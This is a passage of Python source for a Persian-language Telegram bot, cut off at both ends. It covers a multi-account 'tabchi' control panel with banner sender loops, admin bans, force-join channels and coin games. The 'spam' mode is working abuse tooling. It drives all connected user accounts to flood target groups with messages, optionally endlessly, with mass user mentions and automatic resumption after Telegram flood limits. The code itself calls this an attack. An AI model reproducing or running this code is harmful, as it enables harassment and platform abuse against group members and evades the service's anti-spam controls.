                'text': message.text or message.caption or text or '',
                'html': html,
                'file': None,
                'kind': 'text',
                'file_id': None,
                'content_type': getattr(message, 'content_type', 'text'),
                'chat_id': message.chat.id,
                'message_id': message.message_id,
            }
            # اگر مدیا بود file_id نگه دار
            try:
                ct = message.content_type
                if ct == 'photo' and message.photo:
                    item['file_id'] = message.photo[-1].file_id
                    item['kind'] = 'photo'
                elif ct == 'video' and message.video:
                    item['file_id'] = message.video.file_id
                    item['kind'] = 'video'
                elif ct == 'document' and message.document:
                    item['file_id'] = message.document.file_id
                    item['kind'] = 'document'
                elif ct == 'voice' and message.voice:
                    item['file_id'] = message.voice.file_id
                    item['kind'] = 'voice'
                elif ct == 'animation' and message.animation:
                    item['file_id'] = message.animation.file_id
                    item['kind'] = 'gif'
                elif ct == 'sticker' and message.sticker:
                    item['file_id'] = message.sticker.file_id
                    item['kind'] = 'sticker'
            except Exception:
                pass
            st['pending_item'] = item
            st['pending_mid'] = message.message_id
            st['mode'] = 'sender_confirm'
            tabchi_states[uid] = st
            bot.reply_to(message, "بنر درسته ؟\nاگر ویرایش کردی همان پیام را ویرایش کن\nبعد بنویس: تایید")
            return
        if mode == 'sender_confirm':
            if text.strip() != 'تایید':
                bot.reply_to(message, "اگر بنر اوکی است بنویس: تایید")
                return
            # کپی نهایی از آخرین نسخه پیام (بعد از ویرایش)
            pending = st.get('pending_item') or {}
            mid = st.get('pending_mid')
            try:
                if mid:
                    # نمایش یک‌بار برای کاربر
                    bot.copy_message(uid, uid, mid)
            except Exception:
                pass
            st['mode'] = 'sender_minutes'
            tabchi_states[uid] = st
            bot.reply_to(message, "در دقیقه چند بار بنرت ارسال بشه ؟ عددی بگو به دقیقه")
            return
        if mode == 'sender_minutes':
            try:
                minutes = int(text.strip())
                if minutes < 1:
                    raise ValueError()
            except Exception:
                bot.reply_to(message, "فقط عدد دقیقه")
                return
            extras = get_extras(uid)
            info = extras.get(str(acc_id)) or {}
            items = info.get('sender_items') or []
            pending = st.get('pending_item') or {'text': text, 'kind': 'text'}
            items.append(pending)
            info['sender_items'] = items
            info['sender_interval'] = minutes
            extras[str(acc_id)] = info
            set_extras(uid, extras)
            set_user(uid, 'shared_sender_items', items)
            set_user(uid, 'shared_sender_interval', minutes)
            groups = get_ud(uid, 'shared_tabchi_groups', []) or []
            # اول یک‌بار فوری در گروه‌ها
            try:
                async def _first_send():
                    for aid, inf in extras.items():
                        try:
                            key = (int(uid), int(aid))
                            cl = extra_clients.get(key)
                            if not cl:
                                sess = (inf or {}).get('session')
                                if sess:
                                    await start_extra_client(uid, aid, sess)
                                    cl = extra_clients.get(key)
                            if not cl:
                                continue
                            for g in groups:
                                try:
                                    peer = g
                                    import re as _re
                                    m = _re.search(r't\.me/([A-Za-z][A-Za-z0-9_]+)', str(g))
                                    if m:
                                        peer = m.group(1)
                                    fpath = pending.get('file')
                                    cap = pending.get('text') or ''
                                    if fpath and os.path.exists(str(fpath)):
                                        await cl.send_file(peer, fpath, caption=cap or None)
                                    elif cap:
                                        await cl.send_message(peer, cap)
                                except Exception:
                                    continue
                        except Exception:
                            continue
                asyncio.run_coroutine_threadsafe(_first_send(), loop)
            except Exception:
                pass
            sender_jobs[(uid, 'all')] = {
                'interval': minutes,
                'next_ts': __import__('time').time() + minutes * 60,
                'groups': list(groups),
            }
            tabchi_states.pop(uid, None)
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("توقف", callback_data=f"ex_snd_stop_{uid}_{acc_id}"))
            gtxt = chr(10).join(groups[:20]) if groups else "—"
            bot.send_message(
                uid,
                f"ذخیره شد لوپ ارسال {minutes}"+chr(10)+"سندر روشن شد در ↓"+chr(10)+gtxt,
                reply_markup=mk,
                disable_web_page_preview=True,
            )
            return

        if mode == 'spam_text':
            extras = get_extras(uid)
            groups = get_ud(uid, 'shared_spam_groups', []) or []
            if not groups:
                bot.reply_to(message, "اول گروه ثبت کن")
                tabchi_states.pop(uid, None)
                return
            raw = text.strip()
            if raw.strip() == 'توقف':
                return
            infinite = ('بی نهایت' in raw) or ('بی‌نهایت' in raw)
            spam_text = raw
            count = None
            mention_ids = []
            mention_chars = []
            reply_link = None
            import re as _re
            # لینک پیام (اگر هست جدا کن)
            ml = _re.search(r'(https?://\S+|t\.me/\S+)', raw)
            work = raw
            if ml:
                reply_link = ml.group(1)
                work = (raw[:ml.start()] + raw[ml.end():]).strip()
            if infinite:
                spam_text = work.replace('بی نهایت', '').replace('بی‌نهایت', '').strip() or ' '
                count = None
            else:
                # مثل .اتک: آخرین عدد معقول = تعداد؛ قبلش متن؛ بعدش ایدی‌ها و کاراکترها
                nums = list(_re.finditer(r'\b(\d+)\b', work))
                count_span = None
                for m in reversed(nums):
                    n = int(m.group(1))
                    # ایدی‌های ۵+ رقم را به‌عنوان تعداد حساب نکن
                    if 1 <= n <= 1000000 and len(m.group(1)) < 5:
                        count = n
                        count_span = m
                        break
                # اگر پیدا نشد، اولین عدد بزرگ‌تر از ۰
                if count is None:
                    for m in nums:
                        n = int(m.group(1))
                        if 1 <= n <= 1000000:
                            count = n
                            count_span = m
                            break
                if count is None:
                    bot.reply_to(
                        message,
                        "فرمت‌ها:\n"
                        "متن 100\n"
                        "متن بی نهایت\n"
                        "متن 100 123 456 𒄉\n"
                        "متن 100 123 456 𒆒 𒆞\n"
                        "متن 390 https://t.me/c/.../...",
                        disable_web_page_preview=True,
                    )
                    return
                before = work[:count_span.start()].strip()
                after = work[count_span.end():].strip()
                spam_text = before or ' '
                mention_ids = [int(x) for x in _re.findall(r'\b(\d{5,})\b', after)]
                chars_part = _re.sub(r'\b\d{5,}\b', ' ', after).strip()
                mention_chars = [c for c in chars_part.split() if c] if chars_part else []
            if count is not None and count < 1:
                bot.reply_to(message, "تعداد باید بزرگ‌تر از صفر باشد")
                return
            # ساخت متن منشن چندایدی / چندکاراکتر (مثل اتک)
            body_final = spam_text
            parse_md = False
            if mention_ids:
                use_chars = mention_chars if mention_chars else ['.']
                parts = []
                for i, tid in enumerate(mention_ids):
                    ch = use_chars[i] if i < len(use_chars) else use_chars[-1]
                    parts.append("[" + ch + "](tg://user?id=" + str(tid) + ")")
                body_final = (spam_text + " " if spam_text else "") + " ".join(parts)
                parse_md = True
            # resolve reply msg per group
            reply_map = {}
            if reply_link:
                try:
                    parsed = asyncio.run_coroutine_threadsafe(parse_tme_link(reply_link), loop).result(timeout=10)
                    if parsed:
                        reply_map['peer'], reply_map['mid'] = parsed
                except Exception:
                    pass

            extra_spam_jobs[(uid, 'all')] = {
                'text': body_final,
                'count': count,
                'infinite': infinite,
                'mention_ids': mention_ids,
                'mention_chars': mention_chars,
                'parse_md': parse_md,
                'groups': list(groups),
                'sent': 0,
                'active': True,
                'reply_peer': reply_map.get('peer'),
                'reply_mid': reply_map.get('mid'),
                'status_mid': None,
                'status_chat': uid,
                'kind': 'spam',
            }
            tabchi_states.pop(uid, None)
            gtxt = chr(10).join(groups[:10])
            info_txt = "بی‌نهایت" if infinite else str(count)
            try:
                stmsg = bot.send_message(
                    uid,
                    "عملیات اسپم استارت شد در" + chr(10) + gtxt + chr(10)
                    + "تعداد : 0" + chr(10)
                    + "برای بستن عملیات دستور" + chr(10)
                    + "<code>توقف</code>" + chr(10)
                    + "رو بفرست",
                    parse_mode='Markdown',
                    disable_web_page_preview=True,
                )
                extra_spam_jobs[(uid, 'all')]['status_mid'] = stmsg.message_id
            except Exception:
                pass

            async def _run_spam():
                job = extra_spam_jobs.get((uid, 'all'))
                if not job:
                    return
                targets = job.get('groups') or []
                extras_now = get_extras(uid)
                clients_list = []
                for aid, inf in extras_now.items():
                    try:
                        key = (int(uid), int(aid))
                        cl = extra_clients.get(key)
                        if not cl:
                            sess = inf.get('session')
                            if sess:
                                await start_extra_client(uid, aid, sess)
                                cl = extra_clients.get(key)
                        if cl:
                            clients_list.append((aid, cl))
                    except Exception:
                        continue
                if not clients_list:
                    try:
                        bot.send_message(uid, "هیچ اکانت اضافه‌ای متصل نیست")
                    except Exception:
                        pass
                    extra_spam_jobs.pop((uid, 'all'), None)
                    return

                need = job.get('count')
                infinite = bool(job.get('infinite'))
                body0 = job.get('text') or ''
                parse_md = bool(job.get('parse_md'))
                # سازگاری با فرمت قدیمی تک‌ایدی
                if not parse_md and job.get('mention_id'):
                    mid = job.get('mention_id')
                    mch = job.get('mention_char') or '.'
                    body0 = body0 + " [" + mch + "](tg://user?id=" + str(mid) + ")"
                    parse_md = True
                r_peer = job.get('reply_peer')
                r_mid = job.get('reply_mid')
                try:
                    delay = float(get_ud(uid, 'extra_spam_delay', 0) or 0)
                except Exception:
                    delay = 0

                async def _update_status(sent):
                    smid = job.get('status_mid')
                    if not smid:
                        return
                    gtxt2 = chr(10).join((job.get('groups') or [])[:10])
                    try:
                        bot.edit_message_text(
                            "عملیات اسپم استارت شد در" + chr(10) + gtxt2 + chr(10)
                            + "تعداد : " + str(sent) + chr(10)
                            + "برای بستن عملیات دستور" + chr(10)
                            + "<code>توقف</code>" + chr(10)
                            + "رو بفرست",
                            uid, smid, disable_web_page_preview=True,
                        )
                    except Exception:
                        pass

                async def _spam_one(aid, cl, peer):
                    n = 0
                    reply_to = None
                    if r_mid:
                        try:
                            # try resolve message in this group
                            if r_peer is not None:
                                msg = await cl.get_messages(r_peer, ids=int(r_mid))
                                if msg:
                                    reply_to = msg.id
                                    peer = r_peer
                        except Exception:
                            reply_to = None
                    # resolve peer once
                    send_peer = peer
                    try:
                        if isinstance(peer, str) and ('t.me/' in peer or peer.startswith('http')):
                            import re as _re3
                            m3 = _re3.search(r't\.me/([A-Za-z][A-Za-z0-9_]+)', peer)
                            if m3:
                                send_peer = m3.group(1)
                            else:
                                m4 = _re3.search(r't.me/c/(\d+)', peer)
                                if m4:
                                    send_peer = int('-100' + m4.group(1))
                        send_peer = await cl.get_entity(send_peer)
                    except Exception:
                        send_peer = peer
                    fail_streak = 0
                    while True:
                        job2 = extra_spam_jobs.get((uid, 'all'))
                        if not job2 or not job2.get('active'):
                            break
                        if not infinite and need is not None and n >= int(need):
                            break
                        try:
                            if parse_md:
                                await cl.send_message(send_peer, body0, parse_mode='Markdown', reply_to=reply_to)
                            else:
                                await cl.send_message(send_peer, body0, reply_to=reply_to)
                            fail_streak = 0
                            n += 1
                            job2['sent'] = int(job2.get('sent') or 0) + 1
                            if job2['sent'] % 5 == 0:
                                await _update_status(job2['sent'])
                        except FloodWaitError as fw:
                            try:
                                await asyncio.sleep(int(getattr(fw, 'seconds', 5)) + 1)
                            except Exception:
                                await asyncio.sleep(5)
                            continue
                        except Exception:
                            fail_streak += 1
                            if fail_streak > 30:
                                break
                            await asyncio.sleep(0.5)
                            continue
                        if delay > 0:
                            await asyncio.sleep(delay)
                        else:
                            await asyncio.sleep(0.02)
                    return n

                tasks = []
                for aid, cl in clients_list:
                    for g in targets:
                        peer = g
                        try:
                            import re as _re2
                            m = _re2.search(r't\.me/([A-Za-z][A-Za-z0-9_]+)', str(g))
                            if m:
                                peer = m.group(1)
                        except Exception:
                            peer = g
                        tasks.append(_spam_one(aid, cl, peer))
                totals = []
                if tasks:
                    try:
                        totals = await asyncio.gather(*tasks, return_exceptions=True)
                    except Exception:
                        totals = []
                total_sent = 0
                for t in totals:
                    if isinstance(t, int):
                        total_sent += t
                jobf = extra_spam_jobs.pop((uid, 'all'), None)
                try:
                    if jobf and jobf.get('status_mid'):
                        bot.edit_message_text(
                            "عملیات اسپم تمام شد" + chr(10) + "تعداد ارسال شده: " + str(total_sent),
                            uid, jobf['status_mid'],
                        )
                    else:
                        bot.send_message(uid, "گزارش اسپم" + chr(10) + "ارسال شده: " + str(total_sent))
                except Exception:
                    pass

            asyncio.run_coroutine_threadsafe(_run_spam(), loop)
            return
            return



    if uid in admin_states and admin_states[uid].get('step') == 'force_add' and chat == 'private' and is_admin(uid):
        raw = text.strip()
        title = None
        link = raw
        cid = None
        import re as _re
        # 1) لینک دعوت خصوصی: t.me/+HASH یا joinchat
        m_inv = _re.search(r'(?:t\.me/\+|t\.me/joinchat/)([A-Za-z0-9_-]+)', raw, flags=_re.I)
        # 2) لینک خصوصی چنل/گروه: t.me/c/ID/...
        m_priv = _re.search(r't.me/c/(\d+)', raw, flags=_re.I)
        # 3) یوزرنیم عمومی
        m_user = _re.search(r'(?:t\.me/|@)([A-Za-z][A-Za-z0-9_]{3,})', raw)
        # 4) ایدی عددی
        m_id = _re.fullmatch(r'-?\d{5,}', raw)

        try:
            if m_inv:
                inv = m_inv.group(1)
                if 'joinchat' in raw.lower():
                    link = 'https://t.me/joinchat/' + inv
                else:
                    link = 'https://t.me/+' + inv
                try:
                    ch = bot.get_chat(link)
                    cid = ch.id
                    title = getattr(ch, 'title', None) or ('خصوصی ' + str(cid))
                except Exception:
                    cid = link
                    title = 'لینک خصوصی'
            elif m_priv:
                internal = m_priv.group(1)
                cid = int('-100' + internal)
                link = 'https://t.me/c/' + internal
                try:
                    ch = bot.get_chat(cid)
                    title = getattr(ch, 'title', None) or str(cid)
                    # اگر لینک دعوت بهتری در دسترس نیست همان لینک c
                except Exception:
                    title = 'چنل/گروه ' + internal
            elif m_user and 'joinchat' not in raw.lower() and '/+' not in raw and '/c/' not in raw:
                uname = m_user.group(1)
                if uname.lower() in ('joinchat', 'c', 's', 'addstickers', 'share', 'proxy'):
                    raise ValueError('bad')
                link = 'https://t.me/' + uname
                try:
                    ch = bot.get_chat('@' + uname)
                    cid = ch.id
                    title = getattr(ch, 'title', None) or uname
                except Exception:
                    cid = '@' + uname
                    title = uname
            elif m_id:
                cid = int(raw)
                if cid > 0 and not str(cid).startswith('100'):
                    # ممکن است id داخلی بدون -100 باشد
                    try:
                        ch = bot.get_chat(int('-100' + str(cid)))
                        cid = ch.id
                    except Exception:
                        pass
                try:
                    ch = bot.get_chat(cid)
                    title = getattr(ch, 'title', None) or str(cid)
                    un = getattr(ch, 'username', None)
                    link = ('https://t.me/' + un) if un else str(cid)
                except Exception:
                    title = str(cid)
                    link = str(cid)
            else:
                bot.reply_to(message, "لینک عمومی، لینک خصوصی (+/joinchat)، لینک t.me/c/ یا ایدی عددی بفرست")
                return
        except Exception:
            bot.reply_to(message, "نتونستم چنل/گروه رو تشخیص بدم — ربات باید عضو باشد یا لینک درست باشد")
            return

        if cid is None:
            bot.reply_to(message, "لینک یا ایدی معتبر بفرست")
            return

        chs = get_force_channels()
        # جلوگیری از تکراری
        for c in chs:
            if str(c.get('id')) == str(cid) or str(c.get('link')) == str(link):
                del admin_states[uid]
                bot.reply_to(message, "این از قبل تو جوین اجباری هست")
                force_panel(uid)
                return
        # اگر ایدی عددی بود و اسم مشخص نبود، اسم را بپرس
        if m_id or (title and str(title) == str(cid)):
            admin_states[uid] = {
                'step': 'force_add_title',
                'cid': cid, 'link': link, 'title': title or str(cid),
            }
            bot.reply_to(message, "اسمی که روی دکمه شیشه‌ای نمایش داده شود را بنویس:" + chr(10) + "مثال: Ezhdeha")
            return
        chs.append({'id': cid, 'title': title or str(cid), 'link': link})
        set_force_channels(chs)
        del admin_states[uid]
        bot.reply_to(message, "اضافه شد: " + str(title))
        force_panel(uid)
        return

    if chat == 'private' and uid in admin_states and admin_states[uid].get('step') == 'force_add_title' and is_admin(uid):
        st = admin_states[uid]
        title = text.strip() or st.get('title') or str(st.get('cid'))
        chs = get_force_channels()
        chs.append({'id': st.get('cid'), 'title': title, 'link': st.get('link')})
        set_force_channels(chs)
        del admin_states[uid]
        bot.reply_to(message, "اضافه شد: " + str(title))
        force_panel(uid)
        return

    # پیام به یکی
    if chat == 'private' and uid in admin_states and admin_states[uid].get('step') == 'msg_one_id' and is_admin(uid):
        tid = resolve_target_id(text.strip())
        if not tid or str(tid) not in load_data().get('users', {}):
            bot.reply_to(message, "کاربر در ربات پیدا نشد — ایدی یا @یوزرنیم بفرست")
            return
        admin_states[uid] = {'step': 'msg_one_body', 'tid': tid}
        bot.reply_to(message, "پیام را بفرست (متن/عکس/هر فرمت):")
        return

    if chat == 'private' and uid in admin_states and admin_states[uid].get('step') == 'msg_one_body' and is_admin(uid):
        tid = admin_states[uid].get('tid')
        admin_states.pop(uid, None)
        try:
            bot.copy_message(tid, message.chat.id, message.message_id)
            bot.reply_to(message, "ارسال شد به `" + str(tid) + "`", parse_mode='Markdown')
        except Exception:
            try:
                bot.send_message(tid, text)
                bot.reply_to(message, "ارسال شد")
            except Exception as e:
                bot.reply_to(message, "خطا: " + str(e)[:80])
        return

    # حذف بنر با ریپلای
    if chat == 'private' and text.strip() in ('حذف بنر', '.حذف بنر') and message.reply_to_message:
        rep = message.reply_to_message
        cap = (rep.caption or rep.text or '') or ''
        import re as _re
        m = _re.match(r'#(\d+)', cap.strip())
        if not m:
            bot.reply_to(message, "روی پیام بنر از لیست بنر ها ریپلای کن")
            return
        idx = int(m.group(1))
        extras = get_extras(uid)
        # جستجو در همه اک‌ها
        found = False
        for aid, info in list(extras.items()):
            if not isinstance(info, dict):
                continue
            items = list(info.get('sender_items') or [])
            if 0 <= idx < len(items):
                items.pop(idx)
                info['sender_items'] = items
                extras[str(aid)] = info
                set_extras(uid, extras)
                found = True
                bot.reply_to(message, "بنر #" + str(idx) + " حذف شد")
                break
        if not found:
            bot.reply_to(message, "بنر پیدا نشد")
        return

    if chat == 'private' and text in ('پنل', 'panel', '/panel', '.پنل'):
        try:
            tabchi_states.pop(uid, None)
            admin_states.pop(uid, None)
        except Exception:
            pass
        main_panel(uid)
        return


    # انتقال سکه
    tnorm = text.replace('/', '').strip()
    if chat in ['group', 'supergroup'] and message.reply_to_message and (
        text.startswith('انتقال ') or text.startswith('/انتقال ')
    ):
        try:
            amount = int(text.replace('/انتقال', 'انتقال').split()[1])
            if amount <= 0:
                raise ValueError()
        except Exception:
            bot.reply_to(message, "فرمت: انتقال 100")
            return
        frm = uid
        to_user = message.reply_to_message.from_user
        if not to_user:
            return
        to = to_user.id
        if to == frm:
            bot.reply_to(message, "به خودت نمیشود")
            return
        users = load_data()['users']
        if str(frm) not in users or str(to) not in users:
            bot.reply_to(message, "هر دو باید عضو ربات باشند")
            return
        if get_ud(frm, 'coins', 0) < amount:
            bot.reply_to(message, "موجودی کافی نیست")
            return
        fn = message.from_user.first_name or str(frm)
        tn = to_user.first_name or str(to)
        mk = types.InlineKeyboardMarkup(row_width=2)
        mk.add(
            types.InlineKeyboardButton("لغو", callback_data=f"xfer_no_{frm}_{to}_{amount}"),
            types.InlineKeyboardButton("تایید", callback_data=f"xfer_ok_{frm}_{to}_{amount}"),
        )
        bot.reply_to(
            message,
            f"انتقال {amount} سکه از [{fn}](tg://user?id={frm}) به [{tn}](tg://user?id={to})",
            parse_mode='Markdown',
            reply_markup=mk,
        )
        return

    # بازی
    if chat in ['group', 'supergroup'] and (
        text.startswith('بازی ') or text.startswith('/بازی ')
    ):
        try:
            amount = int(text.replace('/بازی', 'بازی').split()[1])
            if amount <= 0:
                raise ValueError()
        except Exception:
            bot.reply_to(message, "فرمت: بازی 100")
            return
        if get_ud(uid, 'coins', 0) < amount:
            bot.reply_to(message, "موجودی کافی نیست")
            return
        if str(uid) not in load_data()['users']:
            bot.reply_to(message, "اول ربات را استارت کن")
            return
        fn = message.from_user.first_name or str(uid)
        mk = types.InlineKeyboardMarkup(row_width=2)
        mk.add(
            types.InlineKeyboardButton("لغو", callback_data=f"game_cancel_{uid}_{amount}"),
            types.InlineKeyboardButton("پیوستن", callback_data=f"game_join_{uid}_{amount}"),
        )
        bot.send_message(
            message.chat.id,
            f"بازی جدید مبلغ {amount} سکه" + chr(10) + "شرکت کنندگان" + chr(10) + f"[{fn}](tg://user?id={uid})",
            parse_mode='Markdown',
            reply_markup=mk,
        )
        return

    # موجودی
    if text in ('.موجودی', 'موجودی', '/موجودی'):
        if message.reply_to_message and message.reply_to_message.from_user:
            tid = message.reply_to_message.from_user.id
            c = get_ud(tid, 'coins', 0)
            title = "**موجودی شما**" if tid == uid else "**موجودی کاربر**"
        else:
            c = get_ud(uid, 'coins', 0)
            title = "**موجودی شما**"
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton(str(c) + " سکه", callback_data="noop"))
        try:
            bot.reply_to(message, title, parse_mode='Markdown', reply_markup=mk)
        except Exception:
            try:
                bot.send_message(message.chat.id, title, parse_mode='Markdown', reply_markup=mk)
            except Exception:
                pass
        return

    # انتقال موجودی — همه کاربران (فقط پیوی)
    if uid in admin_states and chat == 'private':
        st = admin_states[uid]
        if st.get('step') == 'pv_xfer_id':
            try:
                tid = int(to_en_digits(text.strip()))
            except Exception:
                try:
                    bot.delete_message(uid, bot_prompt_msgs.get(uid) or 0)
                except Exception:
                    pass
                m = bot.reply_to(message, "آیدی عددی معتبر بفرست")
                bot_prompt_msgs[uid] = m.message_id
                return
            if tid == uid:
                bot.reply_to(message, "به خودت نمی‌شود")
                return
            if str(tid) not in load_data()['users']:
                bot.reply_to(message, "کاربر در ربات نیست")
                return
            st['tid'] = tid
            st['step'] = 'pv_xfer_amount'
            admin_states[uid] = st
            try:
                bot.delete_message(uid, bot_prompt_msgs.get(uid) or 0)
            except Exception:
                pass
            m = bot.reply_to(message, "مقدار انتقال را بفرست (حداقل ۱۰۰ — فقط عدد):")
            bot_prompt_msgs[uid] = m.message_id
            return
        if st.get('step') == 'pv_xfer_amount':
            try:
                amount = int(to_en_digits(text.strip()))
                if amount < 100:
                    try:
                        bot.delete_message(uid, bot_prompt_msgs.get(uid) or 0)
                    except Exception:
                        pass
                    m = bot.reply_to(message, "حداقل انتقال ۱۰۰ سکه است. دوباره عدد بفرست:")
                    bot_prompt_msgs[uid] = m.message_id
                    return
            except Exception:
                try:
                    bot.delete_message(uid, bot_prompt_msgs.get(uid) or 0)
                except Exception:
                    pass
                m = bot.reply_to(message, "عدد معتبر بفرست")
                bot_prompt_msgs[uid] = m.message_id
                return
            tid = st.get('tid')
            fc = get_ud(uid, 'coins', 0)
            if fc < amount:
                bot.reply_to(message, "موجودی کافی نیست")
                del admin_states[uid]
                return
            st['amount'] = amount
            st['step'] = 'pv_xfer_confirm'
            admin_states[uid] = st
            u = get_user(tid)
            name = u.get('original_name') or str(tid)
            mk = types.InlineKeyboardMarkup(row_width=2)
            mk.add(
                types.InlineKeyboardButton("تایید", callback_data=f"pv_xfer_ok_{uid}_{tid}_{amount}"),
                types.InlineKeyboardButton("لغو", callback_data=f"pv_xfer_no_{uid}"),
            )
            try:
                bot.delete_message(uid, bot_prompt_msgs.get(uid) or 0)
            except Exception:
                pass
            bot.reply_to(
                message,
                "دریافت کننده: " + mention(tid, name) + chr(10)
                + "مقدار انتقال: " + str(amount),
                parse_mode='Markdown',
                reply_markup=mk,
            )
            return

    if uid in admin_states and chat == 'private' and is_admin(uid):
        st = admin_states[uid]
        if st.get('step') == 'ban_id':
            tid = resolve_target_id(text.strip())
            if not tid:
                bot.reply_to(message, "آیدی عددی یا @یوزرنیم معتبر بفرست")
                return
            if is_main_owner(tid) or tid == OWNER_ID:
                bot.reply_to(message, "نمی‌توان مالک اصلی را بن کرد")
                del admin_states[uid]
                return
            if is_owner(tid) and not is_main_owner(uid):
                bot.reply_to(message, "فقط مالک اصلی می‌تواند مالک دیگر را بن کند")
                del admin_states[uid]
                return
            if str(tid) not in load_data()['users']:
                bot.reply_to(message, "کاربر در ربات پیدا نشد")
                return
            if get_ud(tid, 'banned'):
                bot.reply_to(message, "این کاربر از قبل بن است")
                del admin_states[uid]
                return
            st['tid'] = tid
            st['step'] = 'ban_reason'
            admin_states[uid] = st
            bot.reply_to(message, "دلیل بن شدن را بنویس:")
            return
        if st.get('step') == 'ban_reason':
            reason = text.strip() or 'بدون دلیل'
            st['ban_reason'] = reason
            st['step'] = 'ban_custom'
            admin_states[uid] = st
            bot.reply_to(message, "متن دلخواه برای کاربر بن‌شده را بفرست (از طریق ربات ارسال می‌شود):")
            return
        if st.get('step') == 'ban_custom':
            custom = text.strip() or 'شما بن شدید'
            tid = st.get('tid')
            st['ban_custom'] = custom
            st['step'] = 'ban_confirm'
            admin_states[uid] = st
            u = get_user(tid)
            name = u.get('original_name') or str(tid)
            reason = st.get('ban_reason') or 'بدون دلیل'
            mk = types.InlineKeyboardMarkup(row_width=2)
            mk.add(
                types.InlineKeyboardButton("بله", callback_data=f"ban_yes_{tid}"),
                types.InlineKeyboardButton("خیر", callback_data=f"ban_no_{tid}"),
            )
            bot.reply_to(
                message,
                "آیا مطمئنی میخوای بنش کنی؟" + chr(10)
                + "کاربر: " + str(name) + chr(10)
                + "ایدی: `" + str(tid) + "`" + chr(10)
                + "دلیل: " + reason + chr(10)
                + "متن ارسالی: " + custom[:200],
                parse_mode='Markdown',
                reply_markup=mk,
            )
            return
        # ---- بن موقت ----
        if st.get('step') == 'tempban_id':
            tid = resolve_target_id(text.strip())
            if not tid:
                bot.reply_to(message, "آیدی عددی یا @یوزرنیم معتبر بفرست")
                return
            if is_main_owner(tid) or tid == OWNER_ID:
                bot.reply_to(message, "نمی‌توان مالک اصلی را بن کرد")
                del admin_states[uid]
                return
            if str(tid) not in load_data()['users']:
                bot.reply_to(message, "کاربر در ربات پیدا نشد")
                return
            st['tid'] = tid
            st['step'] = 'tempban_reason'
            admin_states[uid] = st
            bot.reply_to(message, "دلیل بن موقت را بنویس:")
            return
        if st.get('step') == 'tempban_reason':
            st['ban_reason'] = text.strip() or 'بدون دلیل'
            st['step'] = 'tempban_hours'
            admin_states[uid] = st
            bot.reply_to(message, "مدت بن را به ساعت بفرست (فقط عدد)" + chr(10) + "مثال: 1 = یک ساعت | 24 = یک روز | 720 = یک ماه")
            return
        if st.get('step') == 'tempban_hours':
            try:
                hours = int(text.strip())
                if hours < 1:
                    raise ValueError()
            except Exception:
                bot.reply_to(message, "عدد معتبر بفرست (ساعت)")
                return
            st['temp_hours'] = hours
            st['step'] = 'tempban_custom'
            admin_states[uid] = st
            bot.reply_to(
                message,
                "متن دلخواه برای کاربر را بفرست:" + chr(10)
                + "پیش‌فرض:" + chr(10)
                + "شما از ربات به مدت " + format_ban_duration(hours) + " بن شدین اگه فکر میکنید مشکلی پیش آمده به پشتیبانی پیام دهید @rockyden",
            )
            return
        if st.get('step') == 'tempban_custom':
            custom = text.strip()
            hours = int(st.get('temp_hours') or 1)
            if not custom:
                custom = (
                    "شما از ربات به مدت " + format_ban_duration(hours)
                    + " بن شدین اگه فکر میکنید مشکلی پیش آمده به پشتیبانی پیام دهید @rockyden"
                )
            tid = st.get('tid')
            st['ban_custom'] = custom
            st['step'] = 'tempban_confirm'
            admin_states[uid] = st
            u = get_user(tid)
            name = u.get('original_name') or str(tid)
            reason = st.get('ban_reason') or 'بدون دلیل'
            mk = types.InlineKeyboardMarkup(row_width=2)
            mk.add(
                types.InlineKeyboardButton("بله", callback_data=f"tempban_yes_{tid}"),
                types.InlineKeyboardButton("خیر", callback_data=f"tempban_no_{tid}"),
            )
            bot.reply_to(
                message,
                "آیا مطمئنی میخوای بن موقت کنی؟" + chr(10)
                + "کاربر: " + str(name) + chr(10)
                + "ایدی: `" + str(tid) + "`" + chr(10)
                + "مدت: " + format_ban_duration(hours) + chr(10)
                + "دلیل: " + reason,
                parse_mode='Markdown',
                reply_markup=mk,
            )
            return
        if st.get('step') == 'add_owner' and is_main_owner(uid):
            try:
                aid = int(text.strip())
            except Exception:
                bot.reply_to(message, "آیدی عددی معتبر وارد کن")
                return
            if is_main_owner(aid):
                bot.reply_to(message, "این کاربر مالک اصلی است")
                del admin_states[uid]
                return
            if str(aid) not in load_data()['users']:
                bot.reply_to(message, "کاربر در ربات ثبت‌نام نکرده")
                return
            if add_owner(aid):
                bot.reply_to(message, f"کاربر `{aid}` مالک شد", parse_mode='Markdown')
                try:
                    bot.send_message(aid, "شما به عنوان مالک ربات منصوب شدید.")
                except Exception:
                    pass
            else:
                bot.reply_to(message, "این کاربر از قبل مالک است")
            del admin_states[uid]
            main_panel(uid)
            return
        if st.get('step') == 'remove_owner' and is_main_owner(uid):
            try:
                aid = int(text.strip())
            except Exception:
                bot.reply_to(message, "آیدی عددی معتبر وارد کن")
                return
            if is_main_owner(aid):
                bot.reply_to(message, "نمی‌توان مالک اصلی را حذف کرد")
                del admin_states[uid]
                return
            if remove_owner(aid):
                bot.reply_to(message, f"کاربر `{aid}` از مالکیت حذف شد", parse_mode='Markdown')
                try:
                    bot.send_message(aid, "شما از مقام مالکیت عزل شدید.")
                except Exception:
                    pass
            else:
                bot.reply_to(message, "این کاربر مالک نیست")
            del admin_states[uid]
            main_panel(uid)
            return
        if st.get('step') == 'unban_id':
            try:
                tid = int(text.strip())
            except Exception:
                bot.reply_to(message, "آیدی عددی معتبر بفرست")
                return
            if str(tid) not in load_data()['users']:
                bot.reply_to(message, "کاربر پیدا نشد")
                return
            if not get_ud(tid, 'banned'):
                bot.reply_to(message, "این کاربر بن نیست")
                del admin_states[uid]
                return
            st['tid'] = tid
            st['step'] = 'unban_msg'
            admin_states[uid] = st
            bot.reply_to(message, "جمله دلخواه برای آنبن را بفرست (همین متن برای کاربر ارسال می‌شود):")
            return
        if st.get('step') == 'unban_msg':
            tid = st.get('tid')
            msg_txt = (text or '').strip()
            if not msg_txt:
                bot.reply_to(message, "متن خالی نباشد. دوباره بفرست:")
                return
            st['unban_msg'] = msg_txt
            st['step'] = 'unban_confirm'
            admin_states[uid] = st
            u = get_user(tid)
            name = u.get('original_name') or str(tid)
            reason = u.get('ban_reason') or '—'
            mk = types.InlineKeyboardMarkup(row_width=2)
            mk.add(
                types.InlineKeyboardButton("بله", callback_data=f"unban_yes_{tid}"),
                types.InlineKeyboardButton("خیر", callback_data=f"unban_no_{tid}"),
            )
            bot.reply_to(
                message,
                "آیا مطمئنی میخوای از بن درش بیاری؟" + chr(10)
